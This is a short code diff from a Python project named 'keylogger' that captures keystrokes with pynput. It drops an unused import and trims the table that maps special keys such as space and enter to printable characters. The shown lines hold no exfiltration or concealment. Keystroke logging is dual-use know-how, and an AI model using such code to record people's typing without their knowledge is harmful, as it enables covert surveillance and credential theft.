@@ -3,7 +3,7 @@ import logging
 import threading
 import keyboard
 from pynput import keyboard as kb
-from typing import List, Protocol, Set, Tuple
+from typing import List, Protocol, Set
 
 from keylogger.data_wrapper import DataWrapper
 
@@ -24,14 +24,7 @@ SPECIAL = {
     kb.Key.cmd_r,
 }
 
-SPECIAL_KEY_PRINT_CODE = {
-    kb.Key.space: " ",
-    kb.Key.backspace: "<-",
-    kb.Key.ctrl: "^",
-    kb.Key.ctrl_l: "^",
-    kb.Key.ctrl_r: "^",
-    kb.Key.enter: "\n",
-}
+SPECIAL_KEY_PRINT_CODE = {kb.Key.space: " ", kb.Key.enter: "\n"}
 
 
 class Listener(Protocol):
